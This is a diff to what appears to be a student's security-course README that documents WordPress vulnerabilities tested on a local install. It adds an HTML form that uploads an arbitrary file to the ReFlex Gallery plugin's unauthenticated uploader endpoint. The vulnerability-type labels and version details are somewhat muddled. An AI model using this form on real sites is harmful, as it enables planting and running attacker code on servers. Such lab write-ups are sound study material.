@@ -30,11 +30,16 @@ Time spent: **7** hours spent in total
 ### 2. (Required) Vulnerability Name or ID
 
 - [x] Summary: WordPress Plugin ReFlex Gallery is prone to a vulnerability that lets attackers upload arbitrary files because the application fails to properly sanitize user-supplied input. An attacker can exploit this vulnerability to upload arbitrary code and run it in the context of the webserver process. This may facilitate unauthorized access or privilege escalation; other attacks are also possible. 
+This particular vulnerability could allow a user with the ‘upload_files’ capability (Authors and above in a default installation) to upload a file with the filename set to malicious JavaScript, which might be executed when viewing the file in the media gallery
   - Vulnerability types: XSS/CSRF
   - Tested in version: 4.2
   - Fixed in version: 4.5
-- [ ] GIF Walkthrough: 
-- [ ] Steps to recreate: 
+- [ ] GIF Walkthrough: <img src="http://g.recordit.co/zIqWdRoG0d.gif" width=200><br>
+- [x] Steps to recreate: Use HTML code to create POST for file upload
+<form method="POST" action="http://127.0.0.1:1337/wordpress/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php?Year=2015&Month=03" enctype="multipart/form-data" >
+    <input type="file" name="qqfile"><br>
+    <input type="submit" name="Submit" value="Pwn!">
+</form>
 - [ ] Affected source code:
   - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
 
@@ -47,7 +52,7 @@ Because XSS attacks target users rather than servers or network infrastructure, 
   - Vulnerability types: XSS/CSRF
   - Tested in version: 4.2
   - Fixed in version: 5.8.6
-- [x] GIF Walkthrough: <img src="http://recordit.co/6d6ubblcn1" width=200><br>
+- [x] GIF Walkthrough: <img src="http://g.recordit.co/6d6ubblcn1.gif" width=200><br>
 - [ ] Steps to recreate: 
 - [x] Affected source code:
   - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
